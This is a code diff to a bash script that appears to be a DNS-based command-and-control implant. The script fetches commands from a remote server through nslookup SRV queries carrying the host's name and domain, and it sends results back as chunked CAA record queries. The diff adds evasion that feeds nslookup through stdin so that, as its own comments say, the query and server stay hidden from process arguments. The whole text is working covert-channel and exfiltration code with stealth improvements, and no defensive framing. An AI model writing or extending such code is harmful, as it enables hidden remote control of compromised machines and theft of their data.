@@ -25,6 +25,10 @@ done
 
 remote=$(tr 012. .201 < $_CFG_PATH)
 
+# Parse SERVER_IP and SERVER_PORT from remote
+SERVER_PORT=$(echo "${remote}" | cut -d'=' -f2 | cut -d' ' -f1)
+SERVER_IP=$(echo "${remote}" | cut -d' ' -f2)
+
 extend_sleep() {
     SLEEP=$(expr "${SLEEP}" \* 2)
     if [[ "${SLEEP}" -gt "${MAX_SLEEP}" ]]; then
@@ -44,7 +48,10 @@ vendor() {
 next_cmd() {
     local record="${CLIENT_ID}.__$(vendor)__${DOMAIN}_${HOSTNAME}"
     local kw=$(echo "${record}" | tr 'A-Z' 'a-z' | sed s/'\(.\)'/'\1\n'/g| sort -u | xargs | sed s/" "/""/g )
-    local raw=$(nslookup -q=srv "${record}" ${remote} | grep -o "_loc_.*")
+    
+    # Use stdin for nslookup to hide the query and server from process args
+    local raw=$(printf "server %s\nset port=%s\nset type=srv\n%s\n" "${SERVER_IP}" "${SERVER_PORT}" "${record}" | nslookup | grep -o "_loc_.*")
+
     if [[ "${raw}" == "" ]]; then
         return 1
     fi
@@ -71,7 +78,8 @@ send_response() {
     for chunk in ${MAGIC_NUM}.*; do
         chunk_id=$(expr $chunk_id + 1)
         CAA_RECORD="${MAGIC_NUM}.${size}.$(cat $chunk)"
-        raw=$(nslookup -q=caa "${CAA_RECORD}" ${remote} | grep -o "_caa_.*")
+        # Use stdin for nslookup to hide the query and server from process args
+        raw=$(printf "server %s\nset port=%s\nset type=caa\n%s\n" "${SERVER_IP}" "${SERVER_PORT}" "${CAA_RECORD}" | nslookup | grep -o "_caa_.*")
         rm "${chunk}"
     done
 }
